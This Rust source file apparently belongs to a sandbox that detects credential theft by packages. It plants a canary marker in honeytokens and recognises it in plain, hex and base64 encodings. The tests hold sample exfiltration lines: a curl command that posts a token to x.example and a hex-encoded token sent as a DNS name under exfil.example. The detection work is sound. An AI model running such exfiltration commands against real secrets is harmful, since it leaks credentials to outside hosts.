//! Planted secrets that can be recognized when they leave.
//!
//! Every honeytoken in the sandbox, in files and in environment variables,
//! contains the same marker. Reading a secret is suspicious; seeing the
//! marker again in a command line, a DNS name or a network payload proves
//! that the secret was taken and sent.

use std::sync::OnceLock;

/// The marker. Letters and digits only, so it survives URLs and DNS names.
/// `sandbox/honey.sh` and `sandbox/trace.sh` plant the same value.
pub const CANARY: &str = "pkgsnitchCanary7f3a9c51d2";

/// Whether `text` carries the marker, plain or in a common encoding.
pub fn leaked(text: &str) -> bool {
    encodings()
        .iter()
        .any(|needle| text.contains(needle.as_str()))
}

/// The marker as it appears plain, lowercased (DNS), hex-encoded, and
/// base64-encoded at each of the three possible byte alignments.
fn encodings() -> &'static [String] {
    static ENCODINGS: OnceLock<Vec<String>> = OnceLock::new();
    ENCODINGS.get_or_init(|| {
        let hex: String = CANARY.bytes().map(|b| format!("{b:02x}")).collect();
        let mut all = vec![
            CANARY.to_string(),
            CANARY.to_lowercase(),
            hex.to_uppercase(),
            hex,
        ];
        for lead in 0..3 {
            // Inside a longer value the marker starts at any offset in a
            // base64 group. Keep only the characters that depend on the
            // marker alone, not on its neighbors.
            let mut bytes = vec![0u8; lead];
            bytes.extend_from_slice(CANARY.as_bytes());
            let encoded = base64(&bytes);
            let first = if lead == 0 { 0 } else { 4 };
            let last = bytes.len() / 3 * 4;
            all.push(encoded[first..last].to_string());
        }
        all
    })
}

fn base64(bytes: &[u8]) -> String {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(bytes.len().div_ceil(3) * 4);
    for chunk in bytes.chunks(3) {
        let n = chunk.iter().fold(0u32, |n, b| n << 8 | u32::from(*b)) << (8 * (3 - chunk.len()));
        for i in 0..4 {
            if i <= chunk.len() {
                out.push(char::from(ALPHABET[(n >> (18 - 6 * i) & 63) as usize]));
            } else {
                out.push('=');
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn base64_matches_the_standard() {
        assert_eq!(base64(b""), "");
        assert_eq!(base64(b"f"), "Zg==");
        assert_eq!(base64(b"fo"), "Zm8=");
        assert_eq!(base64(b"foobar"), "Zm9vYmFy");
    }

    #[test]
    fn recognizes_the_marker_in_every_encoding() {
        let token = format!("npm_{CANARY}");
        let hex: String = token.bytes().map(|b| format!("{b:02x}")).collect();
        assert!(leaked(&format!("curl -d token={token} https://x.example")));
        assert!(leaked(&format!("{hex}.exfil.example")));
        assert!(leaked(&token.to_lowercase()));
        // Embedded in a larger value, at every base64 alignment.
        for prefix in ["", "a", "ab", "abc", "{\"t\":\""] {
            let wrapped = format!("{prefix}{token}\"}}");
            assert!(leaked(&base64(wrapped.as_bytes())), "prefix {prefix:?}");
        }
        assert!(!leaked("npm install left-pad"));
        assert!(!leaked(&base64(b"nothing to see here, move along")));
    }

    #[test]
    fn sandbox_scripts_plant_the_same_marker() {
        assert!(include_str!("../sandbox/honey.sh").contains(CANARY));
        assert!(include_str!("../sandbox/trace.sh").contains(CANARY));
    }
}
